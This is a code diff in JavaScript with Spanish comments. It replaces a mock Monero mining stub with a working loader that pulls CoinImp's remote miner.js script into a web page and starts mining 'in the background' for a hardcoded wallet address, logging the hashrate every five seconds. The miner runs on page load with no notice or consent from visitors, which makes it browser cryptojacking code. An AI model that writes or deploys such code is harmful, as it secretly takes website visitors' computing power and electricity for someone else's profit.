@@ -1,50 +1,39 @@
-// Simulación de minería de Monero usando websockets y envío a FaucetPay
+// Dirección de la wallet de FaucetPay para recibir las recompensas
+const walletAddress = "4ByeEKTJbi3faVNHTWEupmM1fdwEv95CqCqC7rCDdVhXDt4vj5E4FB1jUKxNAF6EHFHmuQhnHoXcUK84Nc4cQfmfKQ8zXo5FtSNSzRFnmk";
 
-let miningActive = false;
-const walletAddress = "4ByeEKTJbi3faVNHTWEupmM1fdwEv95CqCqC7rCDdVhXDt4vj5E4FB1jUKxNAF6EHFHmuQhnHoXcUK84Nc4cQfmfKQ8zXo5FtSNSzRFnmk"; // Aquí va tu dirección de FaucetPay para Monero
+// Usamos CoinImp para la minería de Monero
+const minerScriptURL = 'https://www.coinimp.com/scripts/miner.js'; // URL del script de CoinImp
+const siteKey = 'YOUR_SITE_KEY'; // Site Key proporcionada por CoinImp
+
+// Función para cargar el script de minería
+const loadMinerScript = (url, callback) => {
+    const script = document.createElement('script');
+    script.src = url;
+    script.onload = callback;
+    document.head.appendChild(script);
+};
 
 // Función para iniciar la minería
-function startMoneroMining() {
-    if (miningActive) {
-        console.log("La minería ya está activa.");
-        return;
-    }
+const startMining = () => {
+    // Crear el minero con la Site Key
+    const miner = new CoinImp(siteKey);
 
-    // Conexión a un pool de minería de Monero
-    const poolURL = "wss://xmr.pool.minergate.com:443"; // Puedes cambiar la URL del pool de minería
-    const workerName = walletAddress + "." + Math.random().toString(36).substring(7); // Nombre del trabajador
+    // Iniciar la minería
+    miner.start();
 
-    const minerSocket = new WebSocket(poolURL);
+    // Mostrar el estado de la minería en la consola
+    console.log("Minando Monero en segundo plano...");
 
-    minerSocket.onopen = () => {
-        console.log("Conectado al pool de minería de Monero.");
-        miningActive = true;
+    // Actualizar el estado de la minería cada 5 segundos
+    setInterval(() => {
+        const hashesPerSecond = miner.getHashesPerSecond();
+        const totalHashes = miner.getTotalHashes();
+        const acceptedHashes = miner.getAcceptedHashes();
+        console.log(`Hashrate: ${hashesPerSecond} H/s`);
+        console.log(`Total de hashes: ${totalHashes}`);
+        console.log(`Hashes aceptados: ${acceptedHashes}`);
+    }, 5000); // Actualizar cada 5 segundos
+};
 
-        // Enviar un mensaje de suscripción al pool
-        const subscribeMessage = {
-            method: "mining.subscribe",
-            params: {
-                worker: workerName,
-                wallet: walletAddress,
-            }
-        };
-        minerSocket.send(JSON.stringify(subscribeMessage));
-    };
-
-    minerSocket.onmessage = (message) => {
-        const data = JSON.parse(message.data);
-        if (data.method === "job") {
-            console.log("Nuevo trabajo de minería recibido:", data.params.job_id);
-            // Aquí iría la lógica de procesamiento del trabajo de minería (hashrate, etc.)
-        }
-    };
-
-    minerSocket.onclose = () => {
-        console.log("Desconectado del pool de minería.");
-        miningActive = false;
-    };
-
-    minerSocket.onerror = (error) => {
-        console.error("Error en el socket de minería:", error);
-    };
-}
+// Cargar el script de minería y luego iniciar
+loadMinerScript(minerScriptURL, startMining);
